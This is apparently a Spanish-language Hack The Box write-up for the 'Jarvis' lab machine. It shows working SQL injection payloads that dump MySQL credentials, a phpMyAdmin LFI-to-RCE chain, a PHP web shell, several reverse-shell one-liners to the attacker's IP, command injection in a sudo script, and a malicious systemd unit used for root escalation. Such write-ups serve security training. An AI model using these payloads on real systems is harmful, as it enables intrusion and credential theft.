---
title: Hack The Box Jarvis
author: k4miyo
date: 2021-12-31
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Medium, Linux]
tags: [SQL, SQLi, Injection, Web]
ping: true
---

## Jarvis
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.143.

```bash
❯ ping -c 1 10.10.10.143
PING 10.10.10.143 (10.10.10.143) 56(84) bytes of data.
64 bytes from 10.10.10.143: icmp_seq=1 ttl=63 time=137 ms

--- 10.10.10.143 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 136.756/136.756/136.756/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -T5 -v -n 10.10.10.143 -oG allPorts
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-26 20:08 CST
Initiating Ping Scan at 20:08
Scanning 10.10.10.143 [4 ports]
Completed Ping Scan at 20:08, 0.16s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 20:08
Scanning 10.10.10.143 [65535 ports]
Discovered open port 22/tcp on 10.10.10.143
Discovered open port 80/tcp on 10.10.10.143
SYN Stealth Scan Timing: About 48.38% done; ETC: 20:09 (0:00:33 remaining)
Discovered open port 64999/tcp on 10.10.10.143
Completed SYN Stealth Scan at 20:09, 56.60s elapsed (65535 total ports)
Nmap scan report for 10.10.10.143
Host is up (0.16s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
64999/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 56.92 seconds
           Raw packets sent: 67041 (2.950MB) | Rcvd: 67038 (2.682MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.143
   5   │     [*] Open ports: 22,80,64999
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p22,80,64999 10.10.10.143 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-26 20:10 CST
Nmap scan report for 10.10.10.143
Host is up (0.14s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Stark Hotel
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.25 (Debian)
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.25 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.80 seconds
```

Vemos que se encuentran abiertos los puertos 80 y 64999 asociados al servicio HTTP, por lo que antes de ver el contenido vía web, vamos a ver a lo que nos enfrentamos con la herramienta `whatweb`:

```bash
❯ whatweb http://10.10.10.143/
http://10.10.10.143/ [200 OK] Apache[2.4.25], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[supersecurehotel@logger.htb], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.143], JQuery, Modernizr[2.6.2.min], Open-Graph-Protocol, Script, Title[Stark Hotel], UncommonHeaders[ironwaf], X-UA-Compatible[IE=edge]
❯ whatweb http://10.10.10.143:64999/
http://10.10.10.143:64999/ [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.143], UncommonHeaders[ironwaf]
```

Ahora si procedemos a ver el contenido vía web para ambos puertos:

![""](/assets/images/htb-jarvis/jarvis-web.png)

![""](/assets/images/htb-jarvis/jarvis-web1.png)

Como por el puerto 64999 no nos muestra información que podamos analizar, vamos a empezar por el puerto 80 y tratar de ver los hipervínculos si nos lleva a algún lado haciendo *hovering* y tenemos el archivo `rooms-suites.php` en donde vemos algunas habitaciones que al hacer *hovering* vemos algo curioso `room.php?cod=1` en donde el número cambia de acuerdo con la habitación que seleccionemos; por lo que ya debemos estar pensando que debe existir una base de datos por detrás.

![""](/assets/images/htb-jarvis/jarvis-web2.png)

Si tratamos de hacer un *fuzzing* para descubrir hasta que número hay algún resultado, nos aparecerá el banner mostrado en el puerto 64999; por lo que vamos a omitir el uso de la herramienta `wfuzz` o similares y mejor vamos a utilizar `nmap` para tratar de descubrir nuevas rutas en el servidor web.

```bash
❯ nmap --script http-enum -p80 10.10.10.143 -oN webScan
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-26 20:40 CST
Nmap scan report for 10.10.10.143
Host is up (0.14s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /phpmyadmin/: phpMyAdmin
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.25 (debian)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.25 (debian)'
|_  /js/: Potentially interesting directory w/ listing on 'apache/2.4.25 (debian)'

Nmap done: 1 IP address (1 host up) scanned in 14.10 seconds
```

Tenemos un recurso interesante, `phpmyadmin` que si ingresamos, tenemos el panel de login:

![""](/assets/images/htb-jarvis/jarvis-web3.png)

En este punto, sabemos que existe una base de datos en donde se tienen las habitaciones y la podemos cambiar a través de la URL; por lo que vamos a tratar de realizar unas inyeccions SQL para que ver pasa. 

- 10.10.10.143/room.php?cod=3' or 1=1-- - > Desaparece las imagen y el precio.
- 10.10.10.143/room.php?cod=1 and sleep(5)-- - > Vemos que la web tarda 5 segundos en responder, por lo tanto podría ser vulnerable a SQLi basada en tiempo.
- 10.10.10.143/room.php?cod=0 union select 1,2,3,4,5,6,7-- - > Vemos que se nos muestran las etiquetas para las columnas de las tablas (se estuvo intentando desde 1 hasta donde se observara algún resultado y bajo un número que no mostrata información, en este caso 0). Por lo tanto, ya podríamos escoger un valor de los observamos para inyectar comandos y obtener información sobre la base de datos.

 ![""](/assets/images/htb-jarvis/jarvis-web4.png)

 - 10.10.10.143/room.php?cod=0 union select 1,2,database(),4,5,6,7-- - > Sustituimos la etiqueta del número 3 por el comando `databse()` y al cargar deberíamos de ver que en el lugar donde antes estaba el 3, ahora vemos el nombre de la base de datos, para este caso es **hotel**.

 ![""](/assets/images/htb-jarvis/jarvis-web5.png)

 - 10.10.10.143/room.php?cod=0 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit 0,1-- - > Vemos las bases de datos en el servidor y vamos recorriendolas con `limit 0,1`, `limit 1,1`, `limit 2,1` y así sucesivamente. Por lo que tenemos las siguientes bases de datos:
	 - hotel
	 - information_schema
	 -  mysql
	 - performance_schema

Una forma de obtener las tablas sería con el siguiente comando:

```bash
❯ for i in $(seq 0 10); do echo "[*] DB $i: $(curl -s "http://10.10.10.143/room.php?cod=0%20union%20select%201,2,schema_name,4,5,6,7%20from%20information_schema.schemata%20limit%20$i,1--%20-" | grep "price-room" | awk '{print $2}' FS=">" | cut -d '<' -f 1)"; sleep 2; done
[*] DB 0: hotel
[*] DB 1: information_schema
[*] DB 2: mysql
[*] DB 3: performance_schema
[*] DB 4: 
[*] DB 5: 
^C#
```

De manera similar, podríamos obtener los nombres de las tablas con la sentencia `10.10.10.143/room.php?cod=0 union select 1,2,table_name,4,5,6,7 from information_schema.tables limit 0,1-- -`:

```bash
❯ for i in $(seq 0 150); do echo "[*] Tabla $i: $(curl -s "http://10.10.10.143/room.php?cod=0%20union%20select%201,2,table_name,4,5,6,7%20from%20information_schema.tables%20limit%20$i,1--%20-" | grep "price-room" | awk '{print $2}' FS=">" | cut -d '<' -f 1)"; sleep 2; done
[*] Tabla 0: room
[*] Tabla 1: ALL_PLUGINS
[*] Tabla 2: APPLICABLE_ROLES
^C#                  
```

Para este caso y para adelantar un poco, vamos a empezar desde la tabla 100:

```bash
❯ for i in $(seq 100 150); do echo "[*] Tabla $i: $(curl -s "http://10.10.10.143/room.php?cod=0%20union%20select%201,2,table_name,4,5,6,7%20from%20information_schema.tables%20limit%20$i,1--%20-" | grep "price-room" | awk '{print $2}' FS=">" | cut -d '<' -f 1)"; sleep 2; done
[*] Tabla 100: slow_log
[*] Tabla 101: table_stats
[*] Tabla 102: tables_priv
[*] Tabla 103: time_zone
[*] Tabla 104: time_zone_leap_second
[*] Tabla 105: time_zone_name
[*] Tabla 106: time_zone_transition
[*] Tabla 107: time_zone_transition_type
[*] Tabla 108: user
[*] Tabla 109: accounts
[*] Tabla 110: cond_instances
[*] Tabla 111: events_stages_current
[*] Tabla 112: events_stages_history
[*] Tabla 113: events_stages_history_long
^C#                                                                                                                              
```

Ya vemos una tabla interesante **user**; asi que vamos a tratar de obtener las columnas con la inyección `10.10.10.143/room.php?cod=0 union select 1,2,column_name,4,5,6,7 from information_schema.columns where table_name='user' limit 0,1-- -`:

```bash
❯ for i in $(seq 0 100); do echo "[*] Columna $i: $(curl -s "http://10.10.10.143/room.php?cod=0%20union%20select%201,2,column_name,4,5,6,7%20from%20information_schema.columns%20where%20table_name%20=%20'user'limit%20$i,1--%20-" | grep "price-room" | awk '{print $2}' FS=">" | cut -d '<' -f 1)"; sleep 2; done
[*] Columna 0: Host
[*] Columna 1: User
[*] Columna 2: Password
[*] Columna 3: Select_priv
[*] Columna 4: Insert_priv
[*] Columna 5: Update_priv
[*] Columna 6: Delete_priv
[*] Columna 7: Create_priv
[*] Columna 8: Drop_priv
[*] Columna 9: Reload_priv
[*] Columna 10: Shutdown_priv
[*] Columna 11: Process_priv
[*] Columna 12: File_priv
[*] Columna 13: Grant_priv
[*] Columna 14: References_priv
[*] Columna 15: Index_priv
^C#  
```

Vemos dos columnas que ya nos llaman la atención, **User** y **Password**; así que ahora vamos a tratar de obtener la información de la tabla **user** y en específico, dichas columnas. Eso lo lograremos con la inyección `10.10.10.143/room.php?cod=0 union select 1,2,group_contact(User,0x3a,Password),4,5,6,7 from mysql.user` (**Nota**: Determinamos que la tabla **user** se encuentra en la base de datos **mysql** debido a que el sitio web no presenta una página relacionada al login, por lo tanto la base de datos **hotel** no podría contener alguna tabla en donde se presenten usuarios y contraseñas):

```bash
❯ for i in $(seq 0 10); do echo "[*] Data $i: $(curl -s "http://10.10.10.143/room.php?cod=0%20union%20select%201,2,group_concat(User,0x3a,Password),4,5,6,7%20from%20mysql.user%20limit%20$i,1--%20-" | grep "price-room" | awk '{print $2}' FS=">" | cut -d '<' -f 1)"; sleep 2; done
[*] Data 0: DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
[*] Data 1: 
[*] Data 2: 
[*] Data 3: 
^C#        
```

Ya tenemos unas credenciales que podrían ser del panel de administración de phpmyadmin y debemos recordar que la contraseña se encuentra hasheada, por lo tanto vamos a utilizar la herramienta `john` para crackearla, así que nos creamos un archivo en donde pongamos el hash (DBadmin:\*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0) y procedemos a utilizar la herramienta:

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (mysql-sha1, MySQL 4.1+ [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
imissyou         (DBadmin)
1g 0:00:00:00 DONE (2021-12-26 21:50) 20.00g/s 19520p/s 19520c/s 19520C/s shadow1..ashlee
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Como siempre, guardamos las credenciales que tengamos y procedemos a utilizarlas en el panel de login.

![""](/assets/images/htb-jarvis/jarvis-web6.png)

Ya nos encontramos en el dentro del panel de administración de phpmyadmin. Si checamos la versión, vemos que estamos frente a la 4.8.0, por lo que podríamos buscar algún exploit público que nos ayude.

```bash
❯ searchsploit phpmyadmin 4.8
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
phpMyAdmin 4.8 - Cross-Site Request Forgery                                                    | php/webapps/46982.txt
phpMyAdmin 4.8.0 < 4.8.0-1 - Cross-Site Request Forgery                                        | php/webapps/44496.html
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (1)                                    | php/webapps/44924.txt
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (2)                                    | php/webapps/44928.txt
phpMyAdmin 4.8.4 - 'AllowArbitraryServer' Arbitrary File Read                                  | php/webapps/46041.py
----------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Vemos 2 los cuales parte de un LFI para obtener RCE y de una manera mejor explicada, podemos consultar el recurso [Vulnspy](https://www.vulnspy.com/phpmyadmin-4.8.1/) en donde nos indica que primero debemos contar con credenciales de acceso (ya las tenemos), después realizar la consulta SQL en donde vamos a insertar código php (en el ejemplo se pone `select '<?php phpinfo();exit;?>'`) en donde pondremos nuestro código malicioso; posteriormente consultamos una sesión generada a partir de la consulta utilizando el valor de la cookie **phpMyAdmin** (en el ejemplo nos indica que la ruta es `/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_[el_valor_de_la_cookie]`). Siguiendo dichos pasos, logramos ser el `phpinfo()`, por lo tanto ahora debemos entablarnos una reverse shell para ganar acceso a la máquina (**Nota**: Si tratamos de hacer lo indicado con el comando `phpinfo()`, es necesario salir de la sesión y volver a entrar al panel de login).

- Generamos nuestra reverse shell: `<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.27 443 >/tmp/f");exit;?>`.
- Nos ponemos en escucha por el puerto 443: `nc -nlvp 443`
- Con el plugin **Edit this cookie** obtenemos nuestra cookie para el campo **phpMyAdmin**: glpacrhpqr2ancitvpu72p59j1jkljoc
- Ahora accedemos al siguiente recurso: **10.10.10.143/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_glpacrhpqr2ancitvpu72p59j1jkljoc**

![""](/assets/images/htb-jarvis/jarvis-cookie.png)

```bash
 ❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.143] 39822
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

Ya nos encontramos dentro de la máquina como el usuario **www-data**; sin embargo, no podemos visualizar la flag.

Otra manera de comprometer el equipo es mediante la inclusión de archivos en conjunto con la inyección de comandos SQL, para este caso utilizaremos la sentencia `union select 1,2,3,4,5,6,7-- -` en lugar de poner el número 3 vamos a tratar de poner un texto y posteriormente guardarlo en un archivo bajo una ruta del sistema, que si recordamos, podemos acceder a **images** y vamos a suponer que se encuentra en la ruta absoluta `/var/www/html/images`. Por lo tanto, nuestra sentencia sería `union select 1,2,"Esto es una prueba",4,5,6,7 into outfile "/var/www/html/images/test.txt"`:

![""](/assets/images/htb-jarvis/jarvis-web7.png)

![""](/assets/images/htb-jarvis/jarvis-web8.png)

![""](/assets/images/htb-jarvis/jarvis-web9.png)

Vemos que podemos crear archivos y acceder a ellos, por lo que ya debemos estar pensando en tratar de subir de archivo php que nos permita la ejecución de comandos. Nuestra sentencia sería la siguiente:

```bash
union select 1,2,"<?php echo shell_exec($_REQUEST['cmd']); ?>",4,5,6,7 into outfile "/var/www/html/images/shell.php"
```

![""](/assets/images/htb-jarvis/jarvis-web10.png)

Hemos logrado tener ejecución de comandos a nivel de sistema, así que lo único que nos queda es entablarnos una reverse shell a nuestra máquina de atacante y haremos uso de [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```bash
http://10.10.10.143/images/shell.php?cmd=nc -e /bin/sh 10.10.14.27 443
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.143] 39846
whoami
www-data
```

Como siempre y para trabajar más comodos, vamos a hacer un [Tratamiento de la tty](/posts/tratamiento-tty). Ahora vamos a enumerar un poco el sistema para ver la forma en la que podamos escalar privilegios.

```bash
www-data@jarvis:/var/www/html/images$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@jarvis:/var/www/html/images$ sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
www-data@jarvis:/var/www/html/images$
```

Vemos que podemos ejecutar el script `/var/www/Admin-Utilities/simpler.py` como el usuario **pepper**. Si checamos, tenemos permisos de lectura y una de las opciones que ya nos debería llamar la atención sería el parámetro `-p`, el cual nos permitiría ejecutar comandos a nivel de sistema como el usuario **pepper**.

```bash
www-data@jarvis:/var/www/html/images$ sudo -u pepper /var/www/Admin-Utilities/simpler.py
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************


********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    
www-data@jarvis:/var/www/html/images$
```

Podríamos tratar de ejecutar las siguientes opciones:
- 10.10.14.27; whoami
- 10.10.14.27 && whoami
- loquesea || whoami
- $(whoami)

El último comando no nos muestra nada y para los anteriores se tiene el mensaje ***Got you***; por lo que es posible que se esté ejecutando; así que vamos a crear un archivo en bash bajo la ruta `/dev/shm` que nos entable una reverse shell a nuestra máquina.

```bash
www-data@jarvis:/dev/shm$ cat shell.sh 
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.27/443 0>&1
www-data@jarvis:/dev/shm$ chmod +x shell.sh 
www-data@jarvis:/dev/shm$ ls -l
total 4
-rwxr-xr-x 1 www-data www-data 54 Dec 31 23:26 shell.sh
www-data@jarvis:/dev/shm$
```

Y ahora vamos a ejecutar el script `simpler.py` indicanle que queremos ejecutar un comando a nivel de sistema; además nos ponemos en escucha por el puerto 443.

```bash
www-data@jarvis:/dev/shm$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Enter an IP: $(bash /dev/shm/shell.sh)


```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.143] 39848
pepper@jarvis:/dev/shm$ whoami
whoami
pepper
pepper@jarvis:/dev/shm$
```

Ya nos encontramos dentro de la máquina como el usuario **pepper** y podemos visualizar la flag (user.txt). Ahora nos falta convertirnos en el usuario **root**; pero antes, vamos a hacer nuestro [Tratamiento de la tty](/posts/tratamiento-tty) para trabajar mejor. Enumeraremos un poco el sitema a ver que hay:

```bash
pepper@jarvis:~$ id
uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)
pepper@jarvis:~$ sudo -l
[sudo] password for pepper: 
pepper@jarvis:~$ cd /
pepper@jarvis:/$ find \-perm -4000 2>/dev/null
./bin/fusermount
./bin/mount
./bin/ping
./bin/systemctl
./bin/umount
./bin/su
./usr/bin/newgrp
./usr/bin/passwd
./usr/bin/gpasswd
./usr/bin/chsh
./usr/bin/sudo
./usr/bin/chfn
./usr/lib/eject/dmcrypt-get-device
./usr/lib/openssh/ssh-keysign
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
pepper@jarvis:/$
```

Vemos el binario `/bin/systemctl` tiene permisos SUID, por lo que podríamos ejecutarlo como el propietario del archivo, en este caso **root**

```bash
pepper@jarvis:/$ ls -l /bin/systemctl
-rwsr-x--- 1 root pepper 174520 Feb 17  2019 /bin/systemctl
pepper@jarvis:/$
```

Asi que vamos a crearnos un servicio y en caso de no saber como, podríamos echarle un ojo al siguiente recurso [Tecmint](https://www.tecmint.com/create-new-service-units-in-systemd/). Asi que en el directorio home del usuario **pepper** vamos a crear un directorio y dentro el archivo que necesitamos en donde le indicamos que ejecute nuestra reverse shell en `/dev/shm/`.

```bash
pepper@jarvis:/$ cd /home/pepper/
pepper@jarvis:~$ mkdir privesc
pepper@jarvis:~$ cd !$
cd privesc
pepper@jarvis:~/privesc$ nano privesc.service
pepper@jarvis:~/privesc$ cat privesc.service 
[Unit]
Description = Privesc

[Service]
Type=oneshot
ExecStart = /dev/shm/shell.sh

[Install]
WantedBy = multi-user.target
pepper@jarvis:~/privesc$
```

Ahora creamos un link de nuestro servicio y lo habilitamos, para esto ya debemos estar en escucha por el puerto 443:

```bash
pepper@jarvis:~/privesc$ systemctl link /home/pepper/privesc/privesc.service 
Created symlink /etc/systemd/system/privesc.service -> /home/pepper/privesc/privesc.service.
pepper@jarvis:~/privesc$ systemctl enable --now /home/pepper/privesc/privesc.service
Created symlink /etc/systemd/system/multi-user.target.wants/privesc.service -> /home/pepper/privesc/privesc.service.
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.143] 39850
bash: cannot set terminal process group (1216): Inappropriate ioctl for device
bash: no job control in this shell
root@jarvis:/# whoami
whoami
root
root@jarvis:/# 
```

Ya nos encontramos como el usuario **root** y podemos visualizar la flag (root.txt).
